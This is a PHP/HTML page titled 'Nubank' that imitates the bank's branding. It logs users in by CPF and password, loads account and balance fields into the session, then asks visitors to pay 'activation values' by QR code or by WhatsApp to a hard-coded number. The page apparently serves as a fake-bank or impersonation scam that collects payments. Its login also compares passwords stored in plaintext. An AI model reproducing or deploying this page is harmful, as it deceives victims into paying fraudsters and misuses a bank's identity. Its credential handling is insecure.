
<?php

$cpfx = $_GET['cpf'];

include('conexao.php');

if(isset($_POST['cuser']) || isset($_POST['csenha'])) {

    if(strlen($_POST['cuser']) == 0) {
        echo "";
		    echo "<table width='100%' border='0'>";
 			echo "<tr>";
			echo "<th height='83' bgcolor='#FFFFFF' scope='col'>";
			echo "<img src='imagens/cardfogete.gif' width='150'><center><br>Preencha seu CPF<center>";
			echo "<th/><tr/>";
  			echo "</table>";

		
		
    } else if(strlen($_POST['csenha']) == 0) {
        echo "<table width='100%' border='0'>";
 			echo "<tr>";
			echo "<th height='83' bgcolor='#FFFFFF' scope='col'>";
			echo "<img src='imagens/cardequilibio.gif' width='150'>";
			echo "<center><br>Preencha sua SENHA<center>";
			echo "<th/><tr/>";
  			echo "</table>";
    } else {

        $usuario = $mysqli->real_escape_string($_POST['cuser']);
        $senha = $mysqli->real_escape_string($_POST['csenha']);
		
		$CRITERIO = 'ON';
        $sql_code = "SELECT * FROM usuarios WHERE cpf = '$usuario' AND senha = '$senha' and status = '$CRITERIO'";
        $sql_query = $mysqli->query($sql_code) or die("Falha na execução do código SQL: " . $mysqli->error);

        $quantidade = $sql_query->num_rows;

        if($quantidade == 1) {
            
            $usuario = $sql_query->fetch_assoc();

            if(!isset($_SESSION)) {
                session_start();
            }

            $_SESSION['id'] = $usuario['id_cod'];
            $_SESSION['cpf'] = $usuario['cpf'];
            $_SESSION['nome'] = $usuario['nome'];
            $_SESSION['sobrenome'] = $usuario['sobrenome'];
            $_SESSION['instituicao'] = $usuario['instituicao'];
            $_SESSION['agencia'] = $usuario['agencia'];
            $_SESSION['conta'] = $usuario['conta'];
            $_SESSION['tipodeconta'] = $usuario['tipodeconta'];
            $_SESSION['saldo'] = $usuario['saldo'];

            header("Location: painel2.php");

        } else {
            echo "<table width='100%' border='0'>";
 			echo "<tr>";
			echo "<th height='83' bgcolor='#FFFFFF' scope='col'>";
			echo "<img src='imagens/cardporco.gif' width='150'>";
			echo "<center><br>Falha ao logar!<br>CPF ou Senha incorretos!<center>";
				echo "<th/><tr/>";
  			echo "</table>";

        }

    }

}
?>
<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Nubank</title>
<link rel="stylesheet" href="estilonu.css">

<!-- Place your kit's code here -->
            <script src="https://kit.fontawesome.com/5b81a21603.js" crossorigin="anonymous"></script>
<script language="javascript" type="text/javascript">
            function keyEnterPressed(e, document){
                if(e.keyCode=='13')
                {
                    document.focus();
                }
            }
        </script>

<style type="text/css">
.bordadestaque {
	border: 2px solid #0069FE;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 19px;
	padding: 12px;
	background-color: #FFFFFF;
	border-radius: 5px;
}


A {
	text-decoration: none;
	font-size: 14px;
} 

txt centro {
	text-align: center;
}
#form1 p #cusuario {
	text-align: center;
}
.bordalogin {
	border: 1px solid #820AD1;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 16px;
	padding: 12px;
	background-color: #FFFFFF;
	border-radius: 5px;
}
.campotexto {
	font-family: "Graphik Regular";
	font-size: 26px;
	padding: 16px;
	background-color: #FFFFFF;
	border-radius: 5px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	text-align: center;	
}
.campodata {
	font-family: "Graphik Regular";
	font-size: 26px;
	padding: 16px;
	background-color: #FFFFFF;
	border-radius: 5px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	text-align: center;
}
.campopequeno {
	font-family: "Graphik Regular";
	font-size: 16px;
	padding: 3px;
	background-color: #FFFFFF;
	border-radius: 5px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	text-align: center;
	color: #333;
}
.botaoentrar {
	font-size: 18px;
	background-color: #820AD1;
	width: 280px; /* Ajuste a largura conforme necessário */
	height: 44px; /* Ajuste a altura conforme necessário */
	color: #FFF;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 10px double #820AD1;
	text-align: center;
	font-family: "Graphik Medium";
}
.botavalor {
	font-size: 18px;
	background-color: #62079E;
	width: 280px; /* Ajuste a largura conforme necessário */
	height: 44px; /* Ajuste a altura conforme necessário */
	color: #FFF;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 10px double #62079E;
	text-align: center;
	font-family: "Graphik Medium";
}
.botaowhats {
	font-size: 18px;
	background-color: #009900;
	width: 280px; /* Ajuste a largura conforme necessário */
	height: 44px; /* Ajuste a altura conforme necessário */
	color: #FFF;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 10px double #009900;
	text-align: center;
	font-family: "Graphik Medium";
}
.botaocadastro {
	font-size: 18px;
	background-color: #FFFFFF;
	width: 180px; /* Ajuste a altura conforme necessário */
	color: #820AD1;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 1px solid #820AD1;
	text-align: center;
	height: 30px;
}
body,td,th {
	font-family: Verdana, Geneva, sans-serif;
}
body {
	background: url(<?php echo $selectedBg; ?>);
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-attachment: fixed;
	background-repeat: no-repeat;
	background-scale: 100%;
	background-size: contain;
	background-size: cover;
	text-align: center;
}
.contorno {
	background-color: #FFF;
	width: 390px;
	display: table;
	height: 350px;
	border-radius: 15px;
	opacity: 0.9;
}
.bordaentrada {
	border: 1px solid #CCC;
	border-radius: 30px;
}
</style>
</head>

<body text="#666666" link="#666666" vlink="#333333" alink="black">
<table width="100%" border="0">
  <tr>
    <td height="50" align="center"><table width="90%" border="0">
      <tr>
        <td><a href="login.php"><img src="imagens/x.png" alt="" width="24"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="100%" border="0">
      <tr>
    <td height="50" align="center" valign="middle" class="icon3" style="font-size: 26px; color: #666;">Após cadastrar,<strong><br>
    efetue o pagamento!</strong></td>
  </tr>
  <tr>
    <td align="center" valign="middle" class="icon3">&nbsp;</td>
  </tr>
  </table>
<form action="login.php"  method="POST" >
<center>
  <div class="contorno">
    <table width="300"  border="0" align="center" class="bordaentrada">
      <tr>
        <td width="450" align="center" valign="middle" scope="col"><table width="100%" border="0">
          <tr>
            <td height="43" align="center"><table width="90%" border="0">
              <tr>
                <td align="center"><p class="icon2"><span class="icon4" style="font-size: 16px; color: #666;">1 - Pague com QR CODE!</span></p></td>
                </tr>
              <tr>
                <td align="center"><img src="imagens/qrcode.png"></td>
              </tr>
              <tr>
                <td align="center">&nbsp;</td>
              </tr>
              </table></td>
          </tr>
          </table></td>
      </tr>
  </table>
    <br>
    <table width="95%" border="0">
      
      <tr><td height="55" align="center" valign="middle"><input name="button2" type="submit" class="botaoentrar" id="button2" value="finalizar cadastro" >
        </tr>
      <tr>
        <td height="55" align="center" valign="middle"><a href="valores.php" target="_blank">
          <input type="button" class="botavalor" value="valores de ativação">
        </a>         
        </tr>
      <tr>
        <td height="55" align="center" valign="middle"><a href="https://api.whatsapp.com/send?phone=98981910131&text=<?php echo urlencode('Ativar CPF: ' .  $cpfx); ?>" target="_blank">
          <input type="button" class="botaowhats" value="pagar via whatsapp">
        </a>                </tr>
      <tr>
        <td align="center" valign="middle">                </tr>
    </table>
    <br>
    <br>
  </div></center>
</form>
</body>
</html>